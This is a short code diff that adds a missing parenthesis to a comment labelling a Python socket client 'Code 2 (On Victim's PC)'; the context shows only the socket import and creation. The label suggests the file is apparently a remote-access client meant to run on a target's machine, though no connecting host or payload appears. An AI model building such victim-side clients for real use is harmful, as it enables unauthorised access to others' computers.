@@ -13,7 +13,7 @@
 # input()                         #To stay on Screen
 # _________________________________________________________________
 
-# Client Code: Code 2 (On Victim's PC
+# Client Code: Code 2 (On Victim's PC)
 
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
